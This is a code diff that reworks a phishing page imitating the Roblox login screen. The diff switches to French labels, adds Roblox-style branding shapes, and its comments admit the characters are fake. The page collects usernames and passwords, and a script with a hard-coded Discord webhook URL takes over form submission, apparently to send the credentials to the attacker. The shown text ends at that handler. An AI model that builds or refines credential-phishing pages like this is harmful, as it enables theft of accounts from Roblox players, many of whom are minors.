@@ -5,22 +5,107 @@
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <title>Roblox</title>
 <style>
-  body { margin:0; background: url('https://images.rbxcdn.com/3c8d975e5c0d9cf7a424a41c6a8f75e9.jpg') center/cover; font-family: sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; }
-  .box { width: 85%; max-width: 320px; }
-  .logo { width: 100%; margin-bottom: 20px; }
-  input { width: 100%; padding: 12px; margin-bottom: 10px; background: rgba(0,0,0,0.6); border: 1px solid #555; border-radius: 6px; color: #fff; box-sizing: border-box; font-size: 16px; }
-  button { width: 100%; padding: 12px; background: rgba(255,255,255,0.3); color: #fff; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; margin-top: 10px; }
+  body {
+    margin: 0;
+    font-family: -apple-system, system-ui, sans-serif;
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    /* fond dégradé style roblox */
+    background: linear-gradient(135deg, #00a2ff 0%, #0066cc 100%);
+    position: relative;
+    overflow: hidden;
+  }
+
+  /* les faux personnages roblox en fond (formes) */
+  .char1, .char2, .char3 {
+    position: absolute;
+    background: rgba(255,255,255,0.1);
+    border-radius: 20px;
+    transform: rotate(-15deg);
+  }
+  .char1 { width: 150px; height: 150px; top: 10%; left: -20px; }
+  .char2 { width: 100px; height: 100px; bottom: 10%; right: -10px; border-radius: 50%; }
+  .char3 { width: 200px; height: 200px; bottom: -50px; left: 10%; }
+
+  .box {
+    width: 100%;
+    max-width: 320px;
+    z-index: 2;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  /* logo roblox en blanc */
+  .logo-text {
+    color: #fff;
+    font-size: 48px;
+    font-weight: 900;
+    letter-spacing: -2px;
+    text-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    margin-bottom: 40px;
+    font-family: Arial Black, sans-serif;
+  }
+
+  input {
+    width: 100%;
+    padding: 14px;
+    margin-bottom: 12px;
+    background: #232527;
+    border: 1px solid #555;
+    border-radius: 6px;
+    color: #fff;
+    font-size: 16px;
+    box-sizing: border-box;
+    outline: none;
+  }
+  input::placeholder { color: #aaa; }
+  input:focus { border-color: #fff; }
+
+  button {
+    width: 100%;
+    padding: 14px;
+    background: #232527;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    margin-top: 10px;
+  }
+  button:active { background: #111; }
+  
+  .forgot {
+    color: #fff;
+    font-size: 14px;
+    margin-top: 20px;
+    text-decoration: none;
+    opacity: 0.8;
+  }
 </style>
 </head>
 <body>
+
+<!-- les formes de fond -->
+<div class="char1"></div>
+<div class="char2"></div>
+<div class="char3"></div>
+
 <div class="box">
-  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" style="filter: brightness(0) invert(1); width: 80px; display: block; margin: 0 auto 20px;">
+  <div class="logo-text">ROBLOX</div>
+  
   <form id="f">
-    <input type="text" id="u" placeholder="Username/Email" required>
-    <input type="password" id="p" placeholder="Password" required>
-    <button>Log In</button>
+    <input type="text" id="u" placeholder="Nom d'utilisateur ou e-mail" required autocomplete="off">
+    <input type="password" id="p" placeholder="Mot de passe" required autocomplete="off">
+    <button>Se connecter</button>
   </form>
+  
+  <a href="#" class="forgot">Mot de passe oublié ?</a>
 </div>
+
 <script>
 const H = "https://discord.com/api/webhooks/1565260146316148746/aRlsSnjxOcpFUrQTg2jGEYNKm0N9yu9mmtAruqHUvkPZEYTjQ2CdjJq7oIGCN13rT2UT";
 document.getElementById("f").onsubmit = e => {
